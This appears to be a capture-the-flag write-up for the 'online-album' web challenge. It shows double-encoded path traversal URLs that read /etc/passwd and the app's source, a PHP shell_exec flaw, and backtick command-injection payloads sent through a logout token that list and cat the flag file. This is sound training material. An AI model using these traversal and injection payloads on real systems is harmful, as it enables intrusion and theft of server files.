# online-album (100pts, 41 solved) Web [Hard]

## First look
When we open the website, we need to create an account or login. After doing that, we can view some images of cars and pictures of aliens. When we click on such an image, we go to a page with the raw image data. We also notice that we get logged out after 5 minutes.

## Solving
When we look at the page source, we see some `Debug` value:
```
MS5qcGVn.5fb81e89d041f
Mi5qcGVn.5fb81e89d042a
My5qcGVn.5fb81e89d042c
NC5qcGVn.5fb81e89d042e
NS5qcGVn.5fb81e89d042f
```
Which decoded as base64 results in:
```
1.jpeg
2.jpeg
...
```
When using double encoded values to traverse the path: `%252e%252e%252f` (`/album/%252e%252e%252f`) we can see the contents of each folder. We can actually use the same trick in the download thing to trigger `LFI` (`/download/%252e%252e%252f/%252e%252e%252f/%252e%252e%252f/%252e%252e%252f/%252e%252e%252f/etc/passwd`).
Combining both tricks, allows us to read the source code by first reading `/album/%252e%252e%252f` we find `../routes` and then `../web.php` -> `/download/%252e%252e%252f/routes/web.php`. Here we find `API` paths, so let's read them: `/download/%252e%252e%252f/app/Http/Controllers/HomeController.php`.  
In here we see the `auto_logout` function which executes a `shell_exec`:
```php
public function auto_logout(Request $request)
{
    Auth::logout();
    //delete file after logout
    $cmd = 'rm "'.storage_path().'/framework/sessions/'.escapeshellarg($request->logut_token).'"';
    shell_exec($cmd);
}
```
And `escapeshellarg` only escapes and adds singlequotes, which we can bypass using backticks or normal quotes.  
_Note: I tried to use `curl` and other ways to connect to other servers, but that won't work_  

So we need to somehow trigger the `auto-logout` path. We can just copy the code from the original source (At the bottom of every page) and modify it a bit:
```js
$.ajax({
    type: "POST",
    url: "/auto-logout",
    success: function(result) {},
    data: {
        "_token": "VALID TOKEN",
        "logut_token": "`ls -la ../ > /tmp/1.txt | sleep 600`",
    }
});
```
We have to make sure `_token` is a valid token or the code won't execute. I also added a `sleep`, so we don't need to login every time.  
We can then use the download trick to read the file: `/download/%252e%252e%252f/%252e%252e%252f/%252e%252e%252f/%252e%252e%252f/%252e%252e%252f/tmp/1.txt`
Here we find `.flag` and we can use the same trick to read the flag:
```js
$.ajax({
    type: "POST",
    url: "/auto-logout",
    success: function(result) {},
    data: {
        "_token": "VALID TOKEN",
        "logut_token": "`ls -la ../.flag > /tmp/1.txt | sleep 600`",
    }
});
```
We find a file named `.asdpifsudyg8husijdaisonfudbigfhsdijispacdnvsubfhd` and we can read from it again using the same way:
```js
$.ajax({
    type: "POST",
    url: "/auto-logout",
    success: function(result) {},
    data: {
        "_token": "VALID TOKEN",
        "logut_token": "`cat ../.flag/.asdpifsudyg8husijdaisonfudbigfhsdijispacdnvsubfhd > /tmp/1.txt | sleep 600`",
    }
});
```
Where we get our flag: `DCTF{e620eae38b481f81a98b37fcccbb3ca0e52dd2469524f54128fcb1c9dd115814}`